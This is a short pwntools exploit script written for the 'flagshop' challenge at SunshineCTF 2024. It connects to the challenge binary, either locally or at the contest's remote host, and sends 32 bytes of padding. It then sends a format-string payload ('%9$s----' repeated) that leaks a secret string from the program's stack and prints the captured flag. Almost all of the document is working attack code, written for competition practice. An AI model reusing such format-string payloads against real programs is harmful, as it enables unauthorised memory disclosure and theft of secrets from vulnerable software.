#!/usr/bin/env python3

from pwn import *

exe = ELF("./flagshop")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("2024.sunshinectf.games", 24001)

    return r


def main():
    r = conn()

    r.sendline(b"A" * 32)
    r.sendline(b"%9$s----" * 8)
    
    r.sendline(b"1")
    r.recvuntil(b"----")
    flag = r.recvuntil(b"----", drop = True).decode("ascii")
    log.success(f"Flag obtained: {flag}")


if __name__ == "__main__":
    main()
